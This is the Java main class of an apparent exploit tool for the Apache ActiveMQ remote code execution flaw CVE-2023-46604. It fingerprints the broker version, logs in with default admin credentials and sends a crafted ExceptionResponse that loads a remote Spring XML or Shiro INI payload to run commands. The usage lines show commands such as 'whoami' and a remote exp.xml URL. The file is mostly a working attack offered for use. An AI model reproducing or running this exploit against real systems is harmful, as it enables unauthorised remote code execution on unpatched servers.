package org.example;

import org.apache.activemq.ActiveMQConnection;
import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.ActiveMQSession;
import org.apache.activemq.command.*;
import org.apache.activemq.shiro.env.IniEnvironment;
import org.apache.activemq.transport.tcp.TcpTransport;
import org.apache.activemq.util.MarshallingSupport;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import javax.jms.*;
import java.io.DataInputStream;
import java.net.Socket;
import java.util.Map;
import java.util.regex.Pattern;

import static org.example.test.getIni;

/**
*  CVE-2023-46604 ActiveMQ Exploit
*  2024-03-01
*/
public class Main {
    private static final String IP_ADDRESS_REGEX =
            "^([01]?\\d{1,2}|2[0-4]\\d|25[0-5])\\." +
                    "([01]?\\d{1,2}|2[0-4]\\d|25[0-5])\\." +
                    "([01]?\\d{1,2}|2[0-4]\\d|25[0-5])\\." +
                    "([01]?\\d{1,2}|2[0-4]\\d|25[0-5])$";

    public static boolean isValidIPAddress(String ipAddress) {
        Pattern pattern = Pattern.compile(IP_ADDRESS_REGEX);
        return pattern.matcher(ipAddress).matches();
    }
    public static int compareVersions(String version1, String version2) {
        String[] v1 = version1.split("\\.");
        String[] v2 = version2.split("\\.");

        while (v1.length < v2.length) {
            version1 += ".0";
            v1 = version1.split("\\.");
        }
        while (v2.length < v1.length) {
            version2 += ".0";
            v2 = version2.split("\\.");
        }

        for (int i = 0; i < v1.length; i++) {
            int num1 = Integer.parseInt(v1[i]);
            int num2 = Integer.parseInt(v2[i]);

            if (num1 < num2) {
                return -1;
            } else if (num1 > num2) {
                return 1;
            }
        }

        return 0; 
    }
    public static String fetchServerVersion(String address, String port) {
        try (Socket socket = new Socket(address, Integer.parseInt(port));
             DataInputStream inputStream = new DataInputStream(socket.getInputStream())) {

            byte[] headerBytes = new byte[22];
            inputStream.readFully(headerBytes);

            Map<String, Object> serverInfo = MarshallingSupport.unmarshalPrimitiveMap(inputStream, 4096);
            return serverInfo.getOrDefault("ProviderVersion", "").toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }
    public static void runExploit(  String targetIp, String targetPort, String type ,String payloadUrl){
        runExploit(targetIp, targetPort, type, payloadUrl, "1.9");
    }
    public static void runExploit(String targetIp, String targetPort, String type ,String payloadUrl,String shiro) {

        try {
            String version = fetchServerVersion(targetIp, targetPort);
            System.out.println("[*] Start attacking target: " + targetIp);
            String activeMQUrl = "tcp://" + targetIp + ":" + targetPort + "?jms.closeTimeout=5000";
            ActiveMQConnectionFactory activeMQConnectionFactory = new ActiveMQConnectionFactory(activeMQUrl);

            activeMQConnectionFactory.setTransportListener(new MyTransportListener());
            Connection connection = activeMQConnectionFactory.createConnection("admin", "admin");
            connection.start();
            ActiveMQSession session = (ActiveMQSession) connection.createSession(false, Session.AUTO_ACKNOWLEDGE);

            System.out.println("[+] Target version: " + version);
            if (compareVersions(version, "5.18.3") != -1) {
                System.out.println("[-] The target version does not meet the scope of the vulnerability");
                System.exit(0);
            }

            ExceptionResponse exceptionResponse = new ExceptionResponse();

            if(type.equals("xml")){
                exceptionResponse.setException((Throwable) new ClassPathXmlApplicationContext(payloadUrl));
            } else if (type.equals("ini")) {

                    exceptionResponse.setException((Throwable) new IniEnvironment(getIni(payloadUrl,shiro)));



            }else {
                System.out.println("[-] Incorrect input type");
                System.exit(0);
            }

//

            ((ActiveMQConnection) connection).getTransportChannel().oneway(exceptionResponse);

            System.out.println("[+] Success");
            connection.close();
        } catch (Exception e) {
            System.out.println("[-] Error");
            return;
        }

        System.out.println("[+] Exploit completed");

    }

    public static void main(String[] args)
        {
//            runExploit("127.0.0.1", "61616", "ini","ls","1.8");
            System.err.close();
            System.setErr(System.out);
            String start = "\n" +
                    "    ___          __   _               __  ___ ____      ______              __        _  __     \n" +
                    "   /   |  _____ / /_ (_)_   __ ___   /  |/  // __ \\    / ____/_  __ ____   / /____   (_)/ /_    \n" +
                    "  / /| | / ___// __// /| | / // _ \\ / /|_/ // / / /   / __/  | |/_// __ \\ / // __ \\ / // __/    \n" +
                    " / ___ |/ /__ / /_ / / | |/ //  __// /  / // /_/ /   / /___ _>  < / /_/ // // /_/ // // /_      \n" +
                    "/_/  |_|\\___/ \\__//_/  |___/ \\___//_/  /_/ \\___\\_\\  /_____//_/|_|/ .___//_/ \\____//_/ \\__/      \n" +
                    "                                                                /_/                             \n";
            System.out.println(start);

        String targetIp = args.length >= 1 ? args[0] : "";
        if (targetIp.equals("exp")){
            String cmd = args.length >= 2 ? args[1] : "";
            System.out.println(Exp.getxml(cmd));

        }else if (args.length == 4){
            String targetPort = args[1];
            String type = args[2];
            String payloadUrl = args[3];

            runExploit(targetIp, targetPort,type, payloadUrl);
        }else if (args.length == 5){
            String targetPort = args[1];
            String type = args[2];
            String payloadUrl = args[3];
            String version = args[3];

            runExploit(targetIp, targetPort,type, payloadUrl,version);
        }
        else {
            System.out.println("Usage: java -jar activemq-exp.jar <targetIp> <targetPort> <type> <param> <cb verison>");
            System.out.println("Get exp xml content: java -jar activemq-exp.jar exp <cmd>");
            System.out.println("eg: java -jar activemq-exp.jar 127.0.0.1 61616 ini whoami");
            System.out.println("eg: java -jar activemq-exp.jar 127.0.0.1 61616 ini base64:yv66....");
            System.out.println("eg: java -jar activemq-exp.jar 127.0.0.1 61616 ini whoami 1.8");
            System.out.println("eg: java -jar activemq-exp.jar 127.0.0.1 61616 xml http://127.0.0.1/exp.xml");
        }
        System.exit(0);

    }
}